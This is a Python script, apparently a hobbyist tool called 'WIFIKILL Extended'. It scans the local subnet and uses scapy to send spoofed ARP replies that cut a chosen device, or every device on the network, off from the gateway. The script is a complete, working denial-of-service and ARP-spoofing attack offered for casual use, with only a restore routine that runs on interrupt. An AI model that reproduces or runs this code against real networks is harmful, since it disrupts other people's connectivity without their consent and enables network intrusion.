import os
import socket
import netifaces
from threading import Thread
from scapy.all import *

##
## Owned by Noah Pearson (Discord: coffee#2142)
## WIFIKILL Extended v1.0
## Simple code for noobz to easier understand
## DEAUTH idea from roglew wifikill (https://github.com/roglew/wifikill/)
##

# clear terminal before use
os.system("clear")

# preset values
target_ip = ""
target_mac = ""
host_ip = ""
host_mac = ""
gateway_ip = ""
gateway_mac = ""
live_ips = []
ips_n_macs = []

# get gateway ips
gws = netifaces.gateways()
gateway_ip = gws['default'][2][0]
gateway_ip_list = gateway_ip.split(".")
gateway_ip_list.remove(gateway_ip_list[3])

# get host information
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)

# get all ips
ips = '.'.join(gateway_ip_list)+".1/24"
answers, uans = arping(ips,verbose=0)
for answer in answers:
	ips_n_macs.append([answer[1].psrc,answer[1].hwsrc])

# deauth target
def hurt(target_ip,target_mac,gateway_ip):
	packet = ARP(op=2,psrc=gateway_ip,hwsrc='12:34:56:78:9A:BC',pdst=target_ip,hwdst=target_mac)
	send(packet,verbose=0)
	return True

# restore target
def heal(target_ip,target_mac,gateway_ip,gateway_mac):
	packet = ARP(op=2,psrc=gateway_ip,hwsrc=gateway_mac,pdst=target_ip,hwdst=target_mac)
	send(packet,verbose=0)
	return True

# start GUI for user
print("= = = = = = = = = = =")
print("Gateway IP: "+gateway_ip)
print("Host IP: "+host_ip)
print("= = = = = = = = = = =")
print("Connected IPs")
print("= = = = = = = = = = =")

# show all devices on network
for i in range(len(ips_n_macs)-1):
	print(str(i)+"\t"+ips_n_macs[i][0]+"\t"+ips_n_macs[i][1])

print("a = kill all")

while True:
	choice = input("-> ")
	try:
		# set input choice to select device
		choice = int(choice)
		target_ip = ips_n_macs[choice][0]
		target_mac = ips_n_macs[choice][1]
		print("Booting IP {} MAC {}".format(ips_n_macs[choice][0],ips_n_macs[choice][1]))
		while True:
			try:
				hurt(target_ip,target_mac,gateway_ip)
			except KeyboardInterrupt:
				heal(target_ip,target_mac,gateway_ip,ips_n_macs[0][1])
				print("\nTarget restored")
				break
	except:
		if choice == "a":
			print("Booting all")
			while True:
				# boot all devices on network
				for device in ips_n_macs:
					device_ip = device[0]
					device_mac = device[1]
					try:
						hurt(device_ip,device_mac,gateway_ip)
					except KeyboardInterrupt:
						heal(device_ip,device_mac,gateway_ip,ips_n_macs[0][1])
						print("\nTargets restored")
						break
		else:
			print("Invalid option")
